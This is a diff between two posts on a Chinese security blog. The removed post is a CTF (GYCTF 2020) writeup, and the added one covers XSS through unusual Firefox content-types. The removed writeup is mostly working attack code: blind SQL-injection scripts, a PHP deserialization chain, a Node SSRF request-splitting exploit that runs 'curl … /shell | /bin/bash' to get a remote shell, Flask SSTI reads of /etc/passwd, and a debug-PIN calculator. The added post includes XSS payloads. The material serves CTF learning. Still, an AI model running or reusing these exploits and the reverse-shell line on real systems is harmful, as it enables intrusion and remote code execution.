@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="2020新春战役GYCTF writeup, M0on&#39;s Blog">
-    <meta name="description" content="2020新春战役，武汉加油">
+    <meta name="keywords" content="firefox中content-type的XSS, M0on&#39;s Blog">
+    <meta name="description" content="关于firefox中可以 xss的content-type">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +13,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>2020新春战役GYCTF writeup | M0on&#39;s Blog</title>
+    <title>firefox中content-type的XSS | M0on&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -232,12 +232,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/4.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">2020新春战役GYCTF writeup</h1>
+                    <h1 class="description center-align post-title">firefox中content-type的XSS</h1>
                 </div>
             </div>
         </div>
@@ -358,8 +358,8 @@
                                 <span class="chip bg-color">web</span>
                             </a>
                         
-                            <a href="/tags/writeup/">
-                                <span class="chip bg-color">writeup</span>
+                            <a href="/tags/xss/">
+                                <span class="chip bg-color">xss</span>
                             </a>
                         
                     </div>
@@ -383,7 +383,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-02-24
+                    2020-03-31
                 </div>
                 
 
@@ -392,14 +392,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    342
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    14 分
+                    1 分
                 </div>
                 
 
@@ -415,474 +415,60 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>新春防疫的ctf公益比赛，有些题目可以在<code>buuoj</code>上面复现</strong></p>
-<p>前两天做了发现差不多全是<code>sql注入</code>，要吐了，第三天的题还可以</p>
-<h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="简单的招聘"><a href="#简单的招聘" class="headerlink" title="简单的招聘"></a>简单的招聘</h3><p>在注册 登录那里有<code>insert into</code> 注入，<br>注入结果可以在 <code>pages-profile.php</code>看到</p>
-<p><strong>注册页面</strong></p>
-<pre><code>regname=a','1','1')#&amp;regpass=1</code></pre><p>发现成功注册，但是登录失败，盲猜密码经过了md5 加密</p>
-<p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select group_concat(column_name) from information_schema.columns where table_name=’flag’))#&amp;regpass=admin%27%7C%7C%271</p>
-<p>获取列名</p>
-<p>获取flag</p>
-<p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select flaaag from flag))#&amp;regpass=admin%27%7C%7C%271</p>
-<p>数据库情况:</p>
-<pre><code>表名：
-backup,flag,user
-
-flag:
-id,flaaag</code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>送分题</p>
-<p>后缀<code>php3</code><br>上传成功在  执行 <code>/readflag</code>获得<code>flag</code></p>
-<h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>时间盲注，select 没了，提示<code>flag</code>在<code>fl4g</code>中</p>
-<p>用 regexp注入</p>
-<pre><code>
-import requests
-import time
-import string
-url='http://232047a84d5f4d3684012ab422bff8ae488f8539fdda475c.changame.ichunqiu.com/'
-def inj(payload):
-    t1=time.time()
-    req=requests.get(url,params={'id':payload})
-    t2=time.time()
-    print(t2-t1)
-    if t2-t1&gt;2:
-        return True
-flag='^'
-payload='0||if((fl4g regexp "{}"),sleep(2),1)'
-inj(payload)
-stri='-qwertyuiopasdfghjklzxcvbnm1234567890{}_='
-for i in range(50):
-    for j in stri:
-        tmp=payload.format(flag+j)
-        print(tmp)
-        a=inj(tmp)
-        if a is True:
-            flag+=j
-            print(flag)
-            break
-
-</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题有点意思</p>
-<ul>
-<li>代码审计</li>
-<li>反序列化字符串逃逸</li>
-<li>pop链</li>
-</ul>
-<p><strong>CtrlCase 可以用反序列化逃逸控制</strong></p>
-<p>然后就可以构造pop链</p>
-<p>然后需要找 <code>__destruct</code> 的方法 利用下去</p>
-<ul>
-<li><p>开始想 用反序列化 update 改admin的密码，但是失败了(本地成功。。</p>
-</li>
-<li><p>inseRt iNto 插入用户名也失败了(本地成功。。</p>
-</li>
-<li><p>后来 select 1,md5(1) from user where username=?</p>
-</li>
-</ul>
-<p>看到有回显 1 ，那就注入密码</p>
-<p><strong>pop 链:</strong></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>知识全靠writeup得到，师傅们tqlllll</p>
+<h2 id="MIME-嗅探"><a href="#MIME-嗅探" class="headerlink" title="MIME 嗅探"></a>MIME 嗅探</h2><p>如果<code>content-type</code>是<code>text-plain</code>或者<code>空</code>的话</p>
+<p>浏览器会根据内容格式来决定使用什么解析</p>
+<p>比如:</p>
+<pre><code>&lt;script&gt;alert()&lt;/script&gt;</code></pre><p>就按照<code>text/html</code>来解析</p>
+<p>要防止<code>MIME</code>嗅探，设置</p>
+<pre><code>X-Content-Type-Options：nosniff</code></pre><h2 id="设置"><a href="#设置" class="headerlink" title="设置 */*"></a>设置 <code>*/*</code></h2><p>表示让firefox 猜测 mime-type ，</p>
+<p>即使设置了 <code>X-Content-Type-Options：nosniff</code></p>
+<p>也可以使用，直接忽略，tqllll</p>
+<p><strong>这个在chrome也可以</strong></p>
+<h2 id="设置text-rdf"><a href="#设置text-rdf" class="headerlink" title="设置text/rdf"></a>设置<code>text/rdf</code></h2><p>然后xss 内容是</p>
+<pre><code>&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;
+alert(document.domain)
+&lt;/a:script&gt;
+</code></pre><p>本地测试</p>
 <pre><code>&lt;?php
-class User
+header('content-type:text/rdf');
+
+?&gt;
+&lt;a:script xmlns:a="http://www.w3.org/1999/xhtml"&gt;alert(document.domain)&lt;/a:script&gt;
+</code></pre><h2 id="设置multipart-x-mixed-replace"><a href="#设置multipart-x-mixed-replace" class="headerlink" title="设置multipart/x-mixed-replace;"></a>设置<code>multipart/x-mixed-replace;</code></h2><p>tqlllll</p>
+<p>irefox 有一个 <code>multipart/x-mixed-replace;</code> 类型</p>
+<p>支持多部分响应</p>
+<p>需要有一个 boundary 来分割</p>
+<p>本地测试：</p>
+<pre><code>&lt;?php
+header('content-type: multipart/x-mixed-replace;boundary="XXMIMEBOUNDARY"');
+?&gt;
+--XXMIMEBOUNDARY
+Content-type: text/html
+
+&lt;script&gt;alert()&lt;/script&gt;
+--XXMIMEBOUNDARY
+</code></pre><p>例子：</p>
+<pre><code>Content-Type: Multipart/mixed; boundary="sample_boundary";
+
+Multipart not supported :(
+--sample_boundary
+Content-Type: text/css; charset=utf-8
+Content-Location: http://localhost:2080/file.css
+
+body
 {
-    public $id;
-    public $age = null;
-    public $nickname = null;
+ background-color: yellow;
 }
-class Info
-{
-    public $age;
-    public $nickname;
-    public $CtrlCase;
-}
-Class UpdateHelper
-{
-    public $id;
-    public $newinfo;
-    public $sql;
-}
-class dbCtrl
-{
-    public $hostname="127.0.0.1";
-    public $dbuser="noob123";
-    public $dbpass="noob123";
-    public $database="noob123";
-    public $name='c4ca4238a0b923820dcc509a6f75849b';
-    public $password="1";
-    public $mysqli;
-    public $token='admin';
-}
+--sample_boundary
+Content-Type: application/x-javascript; charset=utf-8
+Content-Location: http://localhost:2080/file.js
 
-$a=new Info();
-$b=new UpdateHelper();
-$c=new User();
-$d=new Info();
-$e=new dbCtrl();
+alert("Hello from a javascript!!!");
 
-$d-&gt;CtrlCase=$e;
+--sample_boundary
 
-$c-&gt;nickname=$d;
-#$c-&gt;age='update user SET password=? where 1';
-$c-&gt;age='select password,md5(1) from user where username=? oR 1';
-#$c-&gt;age='insErt iNto user (username,password,age,nickname) valueS ("m0on",?,"1","1")';
-
-$b-&gt;sql=$c;
-
-$a-&gt;CtrlCase=$b;
-$a-&gt;nickname="1";
-
-$las=serialize($a);
-echo $las."\n";
-echo strlen($las);
-</code></pre><p>从 <code>";s:8:"CtrlCase</code> 开始截取</p>
-<p>然后需要反序列化逃逸 ，使用 *和union 来变成hacker逃逸</p>
-<p>用 <code>python</code> 简单处理一下</p>
-<pre><code>a='''";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}'''
-b=len(a)
-c=b//5
-d=''
-d+='*'*c+(b-c*5)*'union'+a
-print(d)</code></pre><p>构造</p>
-<pre><code>age=1&amp;nickname=***************************************************************************************************";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}</code></pre><p>md5解密 是yingyingying ，看来应该可以弱口令的吧，没有试。。。。醉了</p>
-<p>然后登录在 update.php得到flag</p>
-<h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>叠堆注入 ， set 不能用 ，那就 用handler </p>
-<p>?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</p>
-<pre><code>http://40509bd15cd7405893c4b46c93a1efe7772e15de2f3542b3.changame.ichunqiu.com/?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;
-</code></pre><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>pdo 预处理 使用了 <code>gbk</code>编码，导致宽字节注入，</p>
-<p>叠堆 注入 ，</p>
-<p><code>select</code> 不能用 ，用<code>set</code> 来注入</p>
-<p>,然后时间盲注</p>
-<pre><code>import requests
-import time
-import binascii
-url='http://a265f2d3937e403b89a0563c2dd9e88f7de2577c581345ab.changame.ichunqiu.com/?id='
-def requ(payload):
-    tmp='1%dd%27;set%20@a=0x{};prepare%20haha%20from%20@a;execute%20haha;'.format(hexpay(payload))
-    t1=time.time()
-    req=requests.get(url+tmp)
-    t2=time.time()
-    if t2-t1&gt;2:
-        return True
-def hexpay(payload):
-    pay=binascii.b2a_hex(payload.encode()).decode()
-    return pay
-db='^'
-for i in range(1,100):
-    #for j in range(40,130):
-    for j in '1234567890abcdefABCDEFz':
-        print(j)
-        #payload='''select if(ascii(substr(database(),{},1))={},sleep(2),1)'''.format(str(i),str(j))
-        #payload='''select if(ascii(substr(( select group_concat(table_name) from information_schema.tables where table_schema='pdotest'  ),{},1))={},sleep(2),1)'''.format(str(i),str(j))
-        #payload='''select if((select hex(group_concat(column_name)) regexp '{}' from information_schema.columns where table_name='table1' ),sleep(2),1)'''.format(db+j)
-        payload='''select if((select hex(fllllll4g) regexp '{}' from table1 ),sleep(2),1)'''.format(db+j)
-        #print(payload)
-        a=requ(payload)
-        if a is True:
-            db+=j
-            print(db)
-            break
-        if j=='z':
-            print('false********8')
-</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>先是获得 表名 ，</p>
-<p>or 不能用了 ，</p>
-<p>绕过<code>information_schema</code> </p>
-<p><code>innodb</code> 也不能用了</p>
-<p>用<code>sys.schema_table_statistics_with_buffer</code></p>
-<p>然后 列名 无法得到，</p>
-<p>union select 又不能用，版本<code>5.7</code></p>
-<p>那就看官方文档 ，</p>
-<p>看到了 </p>
-<p><a href="https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html</a></p>
-<p>(column1,column2) = (1,1);</p>
-<p>可以用类似盲注方法 </p>
-<p>(column1,column2) &gt;= (1,1);</p>
-<p>发现 两列的 所以 </p>
-<p><code>where  (1,1)&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code></p>
-<p>，试过几个发现 ， </p>
-<p> <code>where  (1,'a')&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code><br>这样会出错，返回500 ，</p>
-<p>而 第一列 测试发现int型的，</p>
-<p>所以第二列是flag</p>
-<p>所以用 <code>(select 0x61)</code>这样的代表第二列</p>
-<pre><code>
-
-
-import requests
-import time
-import binascii
-url='http://e1feb1a7ba234a06a1669d7949ac16b7c16cbab87af44d76.changame.ichunqiu.com/index.php'
-def inj(payload):
-    req=requests.post(url,data={'id':payload})
-    if 'Hello CQGAME' in req.text:
-        return True
-db=''
-for i in range(50):
-    for j in range(30,130):
-        #payload='''2-(select hex( ( select database() )) regexp '{}'  )'''.format(db+j)
-
-        #payload='''2-(select hex( ( select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database() )) regexp '{}'  )'''.format(db+j)
-
-
-        payload='''3-(select 1   where ((select 1),(select {} ))&gt;= (select * from f1ag_1s_h3r3_hhhhh))'''.format('0x'+binascii.b2a_hex(db.encode()).decode()+hex(j).replace('0x',''))
-        print(payload)
-        a=inj(payload)
-        if  a is True:
-            db+=chr(j-1)
-            print(db)
-            break
-        if j==129:
-            print('false **********8')
-
-</code></pre><p>得到：</p>
-<p>FLAG{2612D538-3A53-4B94-9079-567F7B6EB427|</p>
-<p>只要把 最后一个 | 换成 }</p>
-<p>再全部变成小写就可以了</p>
-<h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p><strong>源代码：</strong></p>
-<pre><code>var express = require('express');
-var app = express();
-var fs = require('fs');
-var path = require('path');
-var http = require('http');
-var pug = require('pug');
-var morgan = require('morgan');
-const multer = require('multer');
-
-
-app.use(multer({dest: './dist'}).array('file'));
-app.use(morgan('short'));
-app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
-app.use("/template",express.static(path.join(__dirname, '/template')))
-
-
-app.get('/', function(req, res) {
-    var action = req.query.action?req.query.action:"index";
-    if( action.includes("/") || action.includes("\\") ){
-        res.send("Errrrr, You have been Blocked");
-    }
-    file = path.join(__dirname + '/template/'+ action +'.pug');
-    var html = pug.renderFile(file);
-    res.send(html);
-});
-
-app.post('/file_upload', function(req, res){
-    var ip = req.connection.remoteAddress;
-    var obj = {
-        msg: '',
-    }
-    if (!ip.includes('127.0.0.1')) {
-        obj.msg="only admin's ip can use it"
-        res.send(JSON.stringify(obj));
-        return 
-    }
-    fs.readFile(req.files[0].path, function(err, data){
-        if(err){
-            obj.msg = 'upload failed';
-            res.send(JSON.stringify(obj));
-        }else{
-            var file_path = '/uploads/' + req.files[0].mimetype +"/";
-            var file_name = req.files[0].originalname
-            var dir_file = __dirname + file_path + file_name
-            if(!fs.existsSync(__dirname + file_path)){
-                try {
-                    fs.mkdirSync(__dirname + file_path)
-                } catch (error) {
-                    obj.msg = "file type error";
-                    res.send(JSON.stringify(obj));
-                    return
-                }
-            }
-            try {
-                fs.writeFileSync(dir_file,data)
-                obj = {
-                    msg: 'upload success',
-                    filename: file_path + file_name
-                } 
-            } catch (error) {
-                obj.msg = 'upload failed';
-            }
-            res.send(JSON.stringify(obj));    
-        }
-    })
-})
-
-app.get('/source', function(req, res) {
-    res.sendFile(path.join(__dirname + '/template/source.txt'));
-});
-
-
-app.get('/core', function(req, res) {
-    var q = req.query.q;
-    var resp = "";
-    if (q) {
-        var url = 'http://localhost:8081/source?' + q
-        console.log(url)
-        var trigger = blacklist(url);
-        if (trigger === true) {
-            res.send("error occurs!
-            ");
-                    } else {
-                        try {
-                            http.get(url, function(resp) {
-                                resp.setEncoding('utf8');
-                                resp.on('error', function(err) {
-                                if (err.code === "ECONNRESET") {
-                                 console.log("Timeout occurs");
-                                 return;
-                                }
-                               });
-
-                                resp.on('data', function(chunk) {
-                                    try {
-                                     resps = chunk.toString();
-                                     res.send(resps);
-                                    }catch (e) {
-                                       res.send(e.message);
-                                    }
-
-                                }).on('error', (e) =&gt; {
-                                     res.send(e.message);});
-                            });
-                        } catch (error) {
-                            console.log(error);
-                        }
-                    }
-                } else {
-                    res.send("search param 'q' missing!");
-                }
-            })
-
-            function blacklist(url) {
-                var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
-                var arrayLen = evilwords.length;
-                for (var i = 0; i &lt; arrayLen; i++) {
-                    const trigger = url.includes(evilwords[i]);
-                    if (trigger === true) {
-                        return true
-                    }
-                }
-            }
-
-            var server = app.listen(8081, function() {
-                var host = server.address().address
-                var port = server.address().port
-                console.log("Example app listening at http://%s:%s", host, port)
-            })
-
-</code></pre><p>思路很清晰<br>/file_upload 有一个限制必须 127.0.0.1<br>先 利用node 的cve ，拆分攻击，http.get() 可以 用 unicode 字符，来CRLF和SSRF</p>
-<p>利用SSRF上传个 文件 ，然后用pug 执行命令 </p>
-<p>可惜一直 被 content-length 坑了 ，这个如果不精确 就会让 服务器 堵塞 30秒，到最后只剩下30分钟才发现这个问题。 难怪一直 失败， 比赛结束之后做出来了，</p>
-<p>poc:弹shell</p>
-<pre><code>import urllib
-import requests
-payload='''dasdas HTTP/1.1
-Host:127.0.0.1:8081
-connection:keep-alive
-
-
-POST /file_upload HTTP/1.1
-Host: 123.57.212.112:33323
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://123.57.212.112:33323/?action=upload
-Content-Type: multipart/form-data; boundary=---------------------------7583695899588870231116957455
-Content-Length: 404
-Connection: close
-Upgrade-Insecure-Requests: 1
-
------------------------------7583695899588870231116957455
-Content-Disposition: form-data; name="file"; filename="ggg.pug"
-Content-Type: ../../../../../usr/src/app/uploads/
-
--[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl http://mu2766c382.zicp.vip:18430/shell | /bin/bash'))")()
------------------------------7583695899588870231116957455--
-
-GET / HTTP/1.1
-connection:close'''.replace("\r\n","\n")
-payload=payload.replace("\n","\r\n")
-print(payload)
-payload=payload.replace("\r",'\u010D').replace("\n",'\u010a').replace(' ','\u0120').replace('"','\u0122').replace("'",'\u0127').replace('-','\u012d').replace('=','\u013d').replace('/','\u012f')
-payload=payload.replace('o','\u016f').replace('e','\u0165').replace('|','\u017c').replace('a','\u0161')
-url='http://182.92.243.154:33322/core?q='
-req=requests.get(url+urllib.parse.quote(payload))
-print(req.text)</code></pre><p>这些blacklist 都可以使用 </p>
-<p><code>replace('o','\u016f')</code></p>
-<p><code>replace('e','\u0165')</code> 绕过</p>
-<p>action 那里可以使用 数组绕过 <code>/</code>和 <code>\</code></p>
-<p>然后访问 </p>
-<pre><code>http://182.92.243.154:33322/?action[]=../../../../../../usr/src/app/uploads/ggg</code></pre><p>执行命令 </p>
-<p>cd /</p>
-<p>cat /flag,txt</p>
-<h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>python3.7</p>
-<p>利用 SSTI 读取文件</p>
-<p>然后 debug pin 执行命令</p>
-<p>在 base64 decode 那里 存在SSTI，这个SSTI 执行命令的被禁了，</p>
-<p>读取文件可以使用 </p>
-<p><code>&lt;class 'urllib.request.URLopener'&gt;</code></p>
-<p>这个类</p>
-<p>使用 base64编码的 </p>
-<pre><code>{{session['__class__'].__mro__[11].__subclasses__()}}</code></pre><p>获取 </p>
-<pre><code>csrf_token=ImQ2ZDgzM2Q0NWYzYThjYjVmZWY2NTU3NjNhYzgxNTRhNTNjNTg1ZmUi.XlNFsg.YPgw6WxuZ6-ZC8z0v129Lf1h42g&amp;text=e3tzZXNzaW9uWydfX2NsYXNzX18nXS5fX21yb19fWzExXS5fX3N1YmNsYXNzZXNfXygpfX0= &amp;submit=%E6%8F%90%E4%BA%A4</code></pre><p>然后 读取 pin 需要的文件</p>
-<pre><code>{{session['__class__'].__mro__[11].__subclasses__()[367]().open_file('/sys/class/net/eth0/address').read()}}</code></pre><p>base64 编码</p>
-<p>再读取 <code>/proc/self/cgroup</code> 获取 <code>machine-id</code></p>
-<p>读取 <code>/etc/passwd</code>获取 用户名 <code>flaskweb</code></p>
-<p>脚本:<br><code>machine-id</code> <code>用户名</code>，<code>/sys/class/net/eth0/address</code>要自己获取</p>
-<pre><code>import hashlib
-from itertools import chain
-probably_public_bits = [
-    'flaskweb'# username
-    'flask.app',# modname
-    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),
-]
-
-private_bits = [
-    '2485377957892',# str(uuid.getnode()),  /sys/class/net/eth0/address
-    '2760c403a7342785875fee2cf06c775c5d54803fe8436f19ce7b9e83281015c2'# get_machine_id(), /etc/machine-id
-]
-
-h = hashlib.md5()
-for bit in chain(probably_public_bits, private_bits):
-    if not bit:
-        continue
-    if isinstance(bit, str):
-        bit = bit.encode('utf-8')
-    h.update(bit)
-h.update(b'cookiesalt')
-
-cookie_name = '__wzd' + h.hexdigest()[:20]
-
-num = None
-if num is None:
-    h.update(b'pinsalt')
-    num = ('%09d' % int(h.hexdigest(), 16))[:9]
-
-rv =None
-if rv is None:
-    for group_size in 5, 4, 3:
-        if len(num) % group_size == 0:
-            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
-                          for x in range(0, len(num), group_size))
-            break
-    else:
-        rv = num
-
-print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>thinkphp6.0的漏洞</p>
-<p>thinkphp6.0 写入shell</p>
-<p>session 如果是 32位 的话， 没有任何过滤就写入 session 文件，thinkphp6的session文件 默认在 <code>runtime</code> 目录下 ，所以 </p>
-<p>构造 32 位 的session 最后四个 是 .php  ，</p>
-<p>然后 就可以写入shell了，</p>
-<p>至于shell的值 要用 $_SESSION[‘’] 这个来构造，很简单</p>
-<p>随便一个用户名 ，用构造的session 登录 ，</p>
-<p>然后 到<code>search</code>页面</p>
-<p>要 <code>search</code> 的历史记录 会记录在session中 ，</p>
-<p>然后就 蚁剑连接</p>
-<p>需要执行 <code>/readflag</code>  才可以 读取flag  ，</p>
-<p>但是有disable_function</p>
-<p>就使用 php-gc 绕过disable_function ，</p>
-<p>平时使用的 exp不行，多找几个类型的 ， 找另外一个 就成功了</p>
-<h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><ul>
-<li>admin  toLowerCase() 绕过</li>
-<li>原型链污染</li>
-</ul>
-<p>merge() 函数可以原型链污染 opts 对象 outputFunctionName</p>
-<p>做到一半 ，发现 可以上车 ，直接获取flag ，醉了<br>详情看<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p>
+</code></pre><p>师傅们tttttttttttqqqqqqqqlllllllllllll</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -926,7 +512,7 @@ print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink"
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/2020/02/24/gyctf2020-writeup/">http://yoursite.com/2020/02/24/gyctf2020-writeup/</a>
+                    <a href="http://yoursite.com/2020/03/31/firefox-content-type-xss/">http://yoursite.com/2020/03/31/firefox-content-type-xss/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -968,8 +554,8 @@ print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink"
                                     <span class="chip bg-color">web</span>
                                 </a>
                             
-                                <a href="/tags/writeup/">
-                                    <span class="chip bg-color">writeup</span>
+                                <a href="/tags/xss/">
+                                    <span class="chip bg-color">xss</span>
                                 </a>
                             
                         </div>
@@ -1014,6 +600,59 @@ print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink"
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2020/04/01/symfony/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Symfony和模板注入的简单学习">
+                        
+                        <span class="card-title">Symfony和模板注入的简单学习</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            简单学习一下 Symfony
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-04-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web/" class="post-category">
+                                    web
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/Symfony/">
+                        <span class="chip bg-color">Symfony</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2020/03/30/volgactf2020-qualifier-bu-fen-writeup/">
                     <div class="card-image">
                         
@@ -1030,9 +669,9 @@ print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink"
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1054,59 +693,6 @@ print(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink"
                     
                     <a href="/tags/writeup/">
                         <span class="chip bg-color">writeup</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/14/sqlite/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="sqlite">
-                        
-                        <span class="card-title">sqlite</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            不忘初心
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-14
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web/" class="post-category">
-                                    web
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                    <a href="/tags/sql/">
-                        <span class="chip bg-color">sql</span>
                     </a>
                     
                 </div>
